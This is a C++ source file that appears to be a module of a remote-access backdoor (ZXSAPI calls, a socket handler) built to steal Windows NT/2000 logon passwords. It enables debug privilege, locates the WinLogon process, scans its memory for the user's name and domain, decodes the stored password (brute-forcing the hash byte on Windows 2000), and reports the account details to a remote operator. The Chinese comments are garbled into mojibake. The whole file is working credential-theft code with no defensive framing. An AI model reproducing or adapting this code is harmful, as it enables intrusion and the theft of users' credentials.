#include <Winternl.h>
/*
typedef struct _UNICODE_STRING 
{ 
   USHORT Length; 
   USHORT MaximumLength; 
   PWSTR Buffer; 
}  UNICODE_STRING, *PUNICODE_STRING; 
*/
typedef struct _QUERY_SYSTEM_INFORMATION 
{ 
   DWORD GrantedAccess; 
   DWORD PID; 
   WORD HandleType; 
   WORD HandleId; 
   DWORD Handle; 
}  QUERY_SYSTEM_INFORMATION, *PQUERY_SYSTEM_INFORMATION; 

typedef struct _PROCESS_INFO_HEADER 
{ 
   DWORD Count; 
   DWORD Unk04; 
   DWORD Unk08; 
}  PROCESS_INFO_HEADER, *PPROCESS_INFO_HEADER; 

typedef struct _PROCESS_INFO 
{ 
   DWORD LoadAddress; 
   DWORD Size; 
   DWORD Unk08; 
   DWORD Enumerator; 
   DWORD Unk10; 
   char Name [0x108]; 
}  PROCESS_INFO, *PPROCESS_INFO; 

typedef struct _ENCODED_PASSWORD_INFO 
{ 
   DWORD HashByte; 
   DWORD Unk04; 
   DWORD Unk08; 
   DWORD Unk0C; 
   FILETIME LoggedOn; 
   DWORD Unk18; 
   DWORD Unk1C; 
   DWORD Unk20; 
   DWORD Unk24; 
   DWORD Unk28; 
   UNICODE_STRING EncodedPassword; 
}  ENCODED_PASSWORD_INFO, *PENCODED_PASSWORD_INFO; 

typedef DWORD (__stdcall *PFNNTQUERYSYSTEMINFORMATION) (DWORD, PVOID, DWORD, PDWORD); 
typedef PVOID (__stdcall *PFNRTLCREATEQUERYDEBUGBUFFER) (DWORD, DWORD); 
typedef DWORD (__stdcall *PFNRTLQUERYPROCESSDEBUGINFORMATION) (DWORD, DWORD, PVOID); 
typedef void (__stdcall *PFNRTLDESTROYQUERYDEBUGBUFFER) (PVOID); 
typedef void (__stdcall *PFNTRTLRUNDECODEUNICODESTRING) (BYTE, PUNICODE_STRING); 

// Private Prototypes 
BOOL IsWinNT (void); 
BOOL IsWin2K (void); 
BOOL AddDebugPrivilege (void); 
DWORD FindWinLogon (void); 
BOOL LocatePasswordPageWinNT (DWORD, PDWORD); 
BOOL LocatePasswordPageWin2K (DWORD, PDWORD); 
void DisplayPasswordWinNT (void); 
void DisplayPasswordWin2K (void); 

// Global Variables 
PFNNTQUERYSYSTEMINFORMATION pfnNtQuerySystemInformation; 
PFNRTLCREATEQUERYDEBUGBUFFER pfnRtlCreateQueryDebugBuffer; 
PFNRTLQUERYPROCESSDEBUGINFORMATION pfnRtlQueryProcessDebugInformation; 
PFNRTLDESTROYQUERYDEBUGBUFFER pfnRtlDestroyQueryDebugBuffer; 
PFNTRTLRUNDECODEUNICODESTRING pfnRtlRunDecodeUnicodeString; 

DWORD PasswordLength = 0; 
PVOID RealPasswordP = NULL; 
PVOID PasswordP = NULL; 
DWORD HashByte = 0;
wchar_t UserName [0x400]; 
wchar_t UserDomain [0x400]; 

extern DWORD GetProcessId( LPCTSTR szProcName );

BOOL GetProcessUserW(DWORD dwPID, WCHAR *szDomainName, WCHAR *szUserName, DWORD nNameLen)
{
	BOOL fResult  = FALSE;
	HANDLE hToken = NULL;
	TOKEN_USER *pTokenUser = NULL;
	HANDLE hProc = ZXSAPI::OpenProcess( PROCESS_ALL_ACCESS, FALSE, dwPID);
	if(!hProc)
		return 0;
	__try
	{

        fResult = ZXSAPI::OpenProcessToken(hProc, TOKEN_QUERY, &hToken);
        if(!fResult)  
		{
			__leave;
		}
		
		DWORD dwNeedLen = 0;		
		fResult = GetTokenInformation(hToken,TokenUser, NULL, 0, &dwNeedLen);
		if (dwNeedLen > 0)
		{
			pTokenUser = (TOKEN_USER*)new BYTE[dwNeedLen];
			fResult = GetTokenInformation(hToken,TokenUser, pTokenUser, dwNeedLen, &dwNeedLen);
			if (!fResult)
			{
				__leave;
			}
		}
		else
		{
			__leave;
		}

		SID_NAME_USE sn;
		DWORD dwDmLen = MAX_PATH;
		fResult = ZXSAPI::LookupAccountSidW(NULL, pTokenUser->User.Sid, szUserName, &nNameLen,
			szDomainName, &dwDmLen, &sn);
	}
	__finally
	{
		if (hToken)
			::CloseHandle(hToken);
		if (pTokenUser)
			delete[] (char*)pTokenUser;

		return fResult;
	}
}

int FindPass(SOCKET Socket) 
{ 
    if ((!IsWinNT ()) && (!IsWin2K ())) 
	{ 
       sprintf (Temp,"System Is Not Windows NT/2000 \r\n"); 
       SendMessage(Socket,Temp);
       return (0); 
	} 

// Add debug privilege to PasswordReminder - 
// this is needed for the search for Winlogon. 
// ����PasswordReminder��Ȩ�� 
// ʹ��PasswordReminder���Դ򿪲�����Winlogon���� 
    if (!AddDebugPrivilege ()) 
	{ 
       printf ("Fail To Set AddDebugPrivilege()\r\n"); 
       return (0); 
	} 

// ��ü���δ����API����ڵ�ַ 
    HINSTANCE hNtDll = ZXSAPI::LoadLibrary ("NTDLL.DLL"); 
    pfnNtQuerySystemInformation = (PFNNTQUERYSYSTEMINFORMATION) ZXSAPI::GetProcAddress (hNtDll, "NtQuerySystemInformation"); 
    pfnRtlCreateQueryDebugBuffer = (PFNRTLCREATEQUERYDEBUGBUFFER) ZXSAPI::GetProcAddress (hNtDll, "RtlCreateQueryDebugBuffer"); 
    pfnRtlQueryProcessDebugInformation = (PFNRTLQUERYPROCESSDEBUGINFORMATION) ZXSAPI::GetProcAddress (hNtDll, "RtlQueryProcessDebugInformation"); 
    pfnRtlDestroyQueryDebugBuffer = (PFNRTLDESTROYQUERYDEBUGBUFFER) ZXSAPI::GetProcAddress (hNtDll, "RtlDestroyQueryDebugBuffer"); 
    pfnRtlRunDecodeUnicodeString = (PFNTRTLRUNDECODEUNICODESTRING) ZXSAPI::GetProcAddress (hNtDll, "RtlRunDecodeUnicodeString"); 

// Locate WinLogon��s PID - need debug privilege and admin rights. 
// ���Winlogon���̵�PID 
// ��������ʹ���˼���Native API����ʵʹ��PSAPIһ������ 
    DWORD WinLogonPID = GetProcessId("WinLogon.exe");
	DWORD ExplorerPID = GetProcessId("Explorer.exe");
    if (WinLogonPID == 0) 
    { 
      sprintf (Temp,"Failed To Find WinLogon\r\n"); 
      SendMessage(Socket,Temp);
      FreeLibrary (hNtDll); 
      return (0); 
    }  

// Set values to check memory block against. 
// ��ʼ���������û��˺���صı��� 
    memset(UserName, 0, sizeof (UserName)); 
    memset(UserDomain, 0, sizeof (UserDomain)); 
    ZXSAPI::GetEnvironmentVariableW(L"USERNAME", UserName, 0x400); 
    ZXSAPI::GetEnvironmentVariableW(L"USERDOMAIN", UserDomain, 0x400); 
	GetProcessUserW(ExplorerPID, UserDomain, UserName, 0x400);

    SendMessage(Socket, "Domain=%S\r\nLogonUser=%S\r\nWinLogonPID=%d\r\n", UserDomain, UserName, WinLogonPID);

// Locate the block of memory containing 
// the password in WinLogon��s memory space. 
// ��Winlogon�����ж�λ����Password���ڴ�� 
    BOOL FoundPasswordPage = FALSE; 
    if (IsWin2K ()) 
        FoundPasswordPage = LocatePasswordPageWin2K (WinLogonPID, &PasswordLength); 
    else 
        FoundPasswordPage = LocatePasswordPageWinNT (WinLogonPID, &PasswordLength); 

    if (FoundPasswordPage) 
	{ 
       if (PasswordLength == 0) 
	   { 
         SendMessage(Socket, "The Logon Information Is: %S/%S/NULL\r\n", UserDomain, UserName);
	   } 
       else 
	   { 
// Decode the password string. 
          if (IsWin2K ()) 
              DisplayPasswordWin2K (); 
          else 
              DisplayPasswordWinNT (); 
	   } 
	} 
    else 
	{
       SendMessage(Socket, "Failed To Find The Password\r\n");
	}

    FreeLibrary (hNtDll); 
    return (0); 
} // main 

// 
// IsWinNT���������жϲ���ϵͳ�Ƿ�WINNT 
// 
BOOL IsWinNT (void) 
{ 
    OSVERSIONINFO OSVersionInfo; 
    OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO); 
    if (ZXSAPI::GetVersionEx (&OSVersionInfo)) 
        return (OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT); 
    else 
        return (FALSE); 
} // IsWinNT 


// 
// IsWin2K���������жϲ���ϵͳ�Ƿ�Win2K 
// 
BOOL IsWin2K (void) 
{ 
    OSVERSIONINFO OSVersionInfo; 
    OSVersionInfo.dwOSVersionInfoSize = sizeof (OSVERSIONINFO); 
    if (ZXSAPI::GetVersionEx (&OSVersionInfo)) 
        return ((OSVersionInfo.dwPlatformId == VER_PLATFORM_WIN32_NT) && (OSVersionInfo.dwMajorVersion == 5)); 
    else 
        return (FALSE); 
} // IsWin2K 


// 
// AddDebugPrivilege���������������Winlogon���̵���Ȩ 
// 
BOOL AddDebugPrivilege (void) 
{ 
    HANDLE Token; 
    TOKEN_PRIVILEGES TokenPrivileges, PreviousState; 
    DWORD ReturnLength = 0; 
    if (ZXSAPI::OpenProcessToken (ZXSAPI::GetCurrentProcess (), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &Token)) 
    if (ZXSAPI::LookupPrivilegeValue (NULL, "SeDebugPrivilege", &TokenPrivileges.Privileges[0].Luid)) 
	{ 
       TokenPrivileges.PrivilegeCount = 1; 
       TokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
       return (ZXSAPI::AdjustTokenPrivileges (Token, FALSE, &TokenPrivileges, sizeof (TOKEN_PRIVILEGES), &PreviousState, &ReturnLength)); 
	} 
    return (FALSE); 
} // AddDebugPrivilege 


// 
// Note that the following code eliminates the need 
// for PSAPI.DLL as part of the executable. 
// FindWinLogon��������Ѱ��WinLogon���� 
// ��������ʹ�õ���Native API����˲���ҪPSAPI��֧�� 
// 
DWORD FindWinLogon (void) 
{ 
    #define INITIAL_ALLOCATION 0x100 
    DWORD rc = 0; 
    DWORD SizeNeeded = 0; 
    PVOID InfoP = HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, INITIAL_ALLOCATION); 
// Find how much memory is required. 
    pfnNtQuerySystemInformation (0x10, InfoP, INITIAL_ALLOCATION, &SizeNeeded); HeapFree (GetProcessHeap (), 0, InfoP); 
// Now, allocate the proper amount of memory. 
    InfoP = HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, SizeNeeded); 
    DWORD SizeWritten = SizeNeeded; 
    if (pfnNtQuerySystemInformation (0x10, InfoP, SizeNeeded, &SizeWritten)) 
	{ 
       HeapFree (GetProcessHeap (), 0, InfoP); 
       return (0); 
	} 
    DWORD NumHandles = SizeWritten / sizeof (QUERY_SYSTEM_INFORMATION); 
    if (NumHandles == 0) 
	{ 
       HeapFree (GetProcessHeap (), 0, InfoP); 
       return (0); 
	} 
    PQUERY_SYSTEM_INFORMATION QuerySystemInformationP = (PQUERY_SYSTEM_INFORMATION) InfoP; DWORD i; 
    for (i = 1; i <= NumHandles; i++) 
	{ 
// "5" is the value of a kernel object type process. 
       if (QuerySystemInformationP->HandleType == 5) 
	   { 
          PVOID DebugBufferP = pfnRtlCreateQueryDebugBuffer (0, 0); 
          if (pfnRtlQueryProcessDebugInformation (QuerySystemInformationP->PID, 1, DebugBufferP) == 0) 
		  { 
             PPROCESS_INFO_HEADER ProcessInfoHeaderP = (PPROCESS_INFO_HEADER) ((DWORD) DebugBufferP + 0x60); 
             DWORD Count = ProcessInfoHeaderP->Count; 
             PPROCESS_INFO ProcessInfoP = (PPROCESS_INFO) ((DWORD) ProcessInfoHeaderP + sizeof (PROCESS_INFO_HEADER)); 
             if (strstr (_strupr (ProcessInfoP->Name), "WINLOGON") != 0) 
			 { 
                  DWORD i; 
                  DWORD dw = (DWORD) ProcessInfoP; 
                  for (i = 0; i < Count; i++) 
				  { 
                     dw += sizeof (PROCESS_INFO); 
                     ProcessInfoP = (PPROCESS_INFO) dw; 
                     if (strstr (_strupr (ProcessInfoP->Name), "NWGINA") != 0) 
                        return (0); 
                     if (strstr (_strupr (ProcessInfoP->Name), "MSGINA") == 0) 
                        rc = QuerySystemInformationP->PID; 
				  } 
                  if (DebugBufferP) 
                      pfnRtlDestroyQueryDebugBuffer (DebugBufferP); HeapFree (GetProcessHeap (), 0, InfoP); 
                  return (rc); 
			 } 
		  } 
          if (DebugBufferP) 
              pfnRtlDestroyQueryDebugBuffer (DebugBufferP); 
	   } 
       DWORD dw = (DWORD) QuerySystemInformationP; 
       dw += sizeof (QUERY_SYSTEM_INFORMATION); 
       QuerySystemInformationP = (PQUERY_SYSTEM_INFORMATION) dw; 
	} 
 
    HeapFree (GetProcessHeap (), 0, InfoP); 
    return (rc); 
} // FindWinLogon 

// 
// LocatePasswordPageWinNT����������NT���ҵ��û����� 
// 
BOOL LocatePasswordPageWinNT (DWORD WinLogonPID, PDWORD PasswordLength) 
{ 
   #define USER_DOMAIN_OFFSET_WINNT 0x200 
   #define USER_PASSWORD_OFFSET_WINNT 0x400 
   BOOL rc = FALSE; 
   HANDLE WinLogonHandle = ZXSAPI::OpenProcess (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, WinLogonPID); 
   if (WinLogonHandle == 0) 
      return (rc); 
   *PasswordLength = 0; 
   SYSTEM_INFO SystemInfo; 
   GetSystemInfo (&SystemInfo); 
   DWORD PEB = 0x7ffdf000; 
   DWORD BytesCopied = 0; 
   PVOID PEBP = HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, SystemInfo.dwPageSize); 
   if (!ZXSAPI::ReadProcessMemory (WinLogonHandle, (PVOID) PEB, PEBP, SystemInfo.dwPageSize, &BytesCopied)) 
   { 
      CloseHandle (WinLogonHandle); 
      return (rc); 
   } 
   // Grab the value of the 2nd DWORD in the TEB. 
   PDWORD WinLogonHeap = (PDWORD) ((DWORD) PEBP + (6 * sizeof (DWORD))); 
   MEMORY_BASIC_INFORMATION MemoryBasicInformation; 
   if (VirtualQueryEx (WinLogonHandle, (PVOID) *WinLogonHeap, &MemoryBasicInformation, sizeof (MEMORY_BASIC_INFORMATION))) 
      if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT) && ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0)) 
	  { 
        PVOID WinLogonMemP = HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, MemoryBasicInformation.RegionSize); 
        if (ZXSAPI::ReadProcessMemory (WinLogonHandle, (PVOID) *WinLogonHeap, WinLogonMemP, MemoryBasicInformation.RegionSize, &BytesCopied)) 
		{ 
           DWORD i = (DWORD) WinLogonMemP; 
           DWORD UserNamePos = 0; 
// The order in memory is UserName followed by the UserDomain. 
// ���ڴ�������UserName��UserDomain�ַ��� 
         do 
		 { 
           if ((wcsicmp (UserName, (wchar_t *) i) == 0) && (wcsicmp (UserDomain, (wchar_t *) (i + USER_DOMAIN_OFFSET_WINNT)) == 0)) 
		   { 
               UserNamePos = i; 
               break; 
		   } 
           i += 2; 
		 } 
		 while (i < (DWORD) WinLogonMemP + MemoryBasicInformation.RegionSize); 
         if (UserNamePos) 
		 { 
             PENCODED_PASSWORD_INFO EncodedPasswordInfoP = (PENCODED_PASSWORD_INFO) ((DWORD) UserNamePos + USER_PASSWORD_OFFSET_WINNT); 
             FILETIME LocalFileTime; 
             SYSTEMTIME SystemTime; 
             if (FileTimeToLocalFileTime (&EncodedPasswordInfoP->LoggedOn, &LocalFileTime)) 
                 if (FileTimeToSystemTime (&LocalFileTime, &SystemTime)) 
                     printf ("You Logged On At %d/%d/%d %d:%d:%d\r\n", SystemTime.wMonth, SystemTime.wDay, SystemTime.wYear, SystemTime.wHour, SystemTime.wMinute, SystemTime.wSecond); 
            *PasswordLength = (EncodedPasswordInfoP->EncodedPassword.Length & 0x00ff) / sizeof (wchar_t); 
// NT���Ǻã�hash-byteֱ�ӷ��ڱ�����:) 
             HashByte = (EncodedPasswordInfoP->EncodedPassword.Length & 0xff00) >> 8; 
             RealPasswordP = (PVOID) (*WinLogonHeap + (UserNamePos - (DWORD) WinLogonMemP) + USER_PASSWORD_OFFSET_WINNT + 0x34); 
             PasswordP = (PVOID) ((PBYTE) (UserNamePos + USER_PASSWORD_OFFSET_WINNT + 0x34)); 
             rc = TRUE; 
		 } 
		} 
	  } 

      HeapFree (GetProcessHeap (), 0, PEBP); 
      CloseHandle (WinLogonHandle); 
      return (rc); 
} // LocatePasswordPageWinNT 


// 
// LocatePasswordPageWin2K����������Win2K���ҵ��û����� 
// 
BOOL LocatePasswordPageWin2K (DWORD WinLogonPID, PDWORD PasswordLength) 
{ 
    #define USER_DOMAIN_OFFSET_WIN2K 0x400 
    #define USER_PASSWORD_OFFSET_WIN2K 0x800 
    HANDLE WinLogonHandle = ZXSAPI::OpenProcess (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, WinLogonPID); 
    if (WinLogonHandle == 0) 
       return (FALSE); 
    *PasswordLength = 0; 
    SYSTEM_INFO SystemInfo; 
    GetSystemInfo (&SystemInfo); 
    DWORD i = (DWORD) SystemInfo.lpMinimumApplicationAddress; 
    DWORD MaxMemory = (DWORD) SystemInfo.lpMaximumApplicationAddress; 
    DWORD Increment = SystemInfo.dwPageSize; 
    MEMORY_BASIC_INFORMATION MemoryBasicInformation; 
    while (i < MaxMemory) 
	{ 
        if (VirtualQueryEx (WinLogonHandle, (PVOID) i, &MemoryBasicInformation, sizeof (MEMORY_BASIC_INFORMATION))) 
		{ 
           Increment = MemoryBasicInformation.RegionSize; 
           if (((MemoryBasicInformation.State & MEM_COMMIT) == MEM_COMMIT) && ((MemoryBasicInformation.Protect & PAGE_GUARD) == 0)) 
		   { 
                PVOID RealStartingAddressP = HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, MemoryBasicInformation.RegionSize); 
                DWORD BytesCopied = 0; 
                if (ZXSAPI::ReadProcessMemory (WinLogonHandle, (PVOID) i, RealStartingAddressP, MemoryBasicInformation.RegionSize, &BytesCopied)) 
				{ 
// ��WinLogon���ڴ�ռ���Ѱ��UserName��DomainName���ַ��� 
                    if ((wcsicmp ((wchar_t *) RealStartingAddressP, UserName) == 0) && (wcsicmp ((wchar_t *) ((DWORD) RealStartingAddressP + USER_DOMAIN_OFFSET_WIN2K), UserDomain) == 0)) 
					{ 
                       RealPasswordP = (PVOID) (i + USER_PASSWORD_OFFSET_WIN2K); 
                       PasswordP = (PVOID) ((DWORD) RealStartingAddressP + USER_PASSWORD_OFFSET_WIN2K); 
// Calculate the length of encoded unicode string. 
// ��������ĵĳ��� 
                       PBYTE p = (PBYTE) PasswordP; 
                       DWORD Loc = (DWORD) p; 
                       DWORD Len = 0; 
                       if ((*p == 0) && (* (PBYTE) ((DWORD) p + 1) == 0)) 
						   ; 
                       else 
                           do 
						   { 
                              Len++; 
                              Loc += 2; 
                              p = (PBYTE) Loc; 
						   } 
						   while (*p != 0); 
                      *PasswordLength = Len; 
                     CloseHandle (WinLogonHandle); 
                     return (TRUE); 
					} 
				} 
           HeapFree (GetProcessHeap (), 0, RealStartingAddressP); 
		   } 
		} 
     else 
     Increment = SystemInfo.dwPageSize; 
// Move to next memory block. 
     i += Increment; 
	} 
   CloseHandle (WinLogonHandle); 
   return (FALSE); 
} // LocatePasswordPageWin2K 


// 
// DisplayPasswordWinNT����������NT�н����û����� 
// 
void DisplayPasswordWinNT (void) 
{ 
    UNICODE_STRING EncodedString; 
    EncodedString.Length = (WORD) PasswordLength * sizeof (wchar_t); 
    EncodedString.MaximumLength = ((WORD) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t); 
    EncodedString.Buffer = (PWSTR) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, EncodedString.MaximumLength); 
	CopyMemory (EncodedString.Buffer, PasswordP, PasswordLength * sizeof (wchar_t)); 
// Finally - decode the password. 
// Note that only one call is required since the hash-byte 
// was part of the orginally encoded string. 
// ��NT�У�hash-byte�ǰ����ڱ����е� 
// ���ֻ��Ҫֱ�ӵ��ú�������Ϳ����� 
    pfnRtlRunDecodeUnicodeString ((BYTE) HashByte, &EncodedString); 
    sprintf (Temp,"The Logon Information Is: %S/%S/%S\r\n", UserDomain, UserName, EncodedString.Buffer); 
    HeapFree (GetProcessHeap (), 0, EncodedString.Buffer); 
} // DisplayPasswordWinNT 

// 
// DisplayPasswordWin2K����������Win2K�н����û����� 
// 
void DisplayPasswordWin2K (void) 
{ 
   DWORD i, Hash = 0; 
   UNICODE_STRING EncodedString; 
   EncodedString.Length = 
   (USHORT) PasswordLength * sizeof (wchar_t); 
   EncodedString.MaximumLength =  ((USHORT) PasswordLength * sizeof (wchar_t)) + sizeof (wchar_t); 
   EncodedString.Buffer = (PWSTR) HeapAlloc (GetProcessHeap (), HEAP_ZERO_MEMORY, EncodedString.MaximumLength); 
// This is a brute force technique since the hash-byte 
// is not stored as part of the encoded string - :>(. 
// ��Ϊ��Win2K��hash-byte��������ڱ����� 
// ������������е��Ǳ����ƽ� 
// �����ѭ����i����hash-byte 
// ���ǽ�i��0x00��0xff�ֱ�����Ľ��н��� 
// �����һ��hash-byteʹ���������붼�ǿɼ��ַ�������Ϊ����Ч�� 
// ����㷨ʵ�����ǴӸ��ʽǶ�������� 
// ��Ϊ���hash-byte���Զ����ܳ��������붼�ǿɼ��ַ��ĸ��ʷǳ�С 
   for (i = 0; i <= 0xff; i++) 
   { 
       CopyMemory (EncodedString.Buffer, PasswordP, PasswordLength * sizeof (wchar_t)); 
// Finally - try to decode the password. 
// ʹ��i��Ϊhash-byte�����Ľ��н��� 
       pfnRtlRunDecodeUnicodeString ((BYTE) i, &EncodedString); 
// Check for a viewable password. 
// ��������������Ƿ���ȫ�ɿɼ��ַ���� 
// ���������Ϊ����ȷ�Ľ��� 
       PBYTE p = (PBYTE) EncodedString.Buffer; 
       BOOL Viewable = TRUE; 
       DWORD j, k; 
       for (j = 0; (j < PasswordLength) && Viewable; j++) 
	   { 
           if ((*p) && (* (PBYTE)(DWORD (p) + 1) == 0)) 
		   { 
                if (*p < 0x20) 
                Viewable = FALSE; 
                if (*p > 0x7e) 
                Viewable = FALSE; 
//0x20�ǿո�0X7E��~��������������ʹ�õĿɼ��ַ��������������� 
		   } 
           else 
              Viewable = FALSE; 
           k = DWORD (p); 
           k++; k++; 
           p = (PBYTE) k; 
	   } 
       if (Viewable) 
	   { 
          sprintf (Temp,"The Logon Information Is: %S/%S/%S\r\n", UserDomain, UserName, EncodedString.Buffer); 
	   } 
   } 
   HeapFree (GetProcessHeap (), 0, EncodedString.Buffer); 
} // DisplayPasswordWin2K 


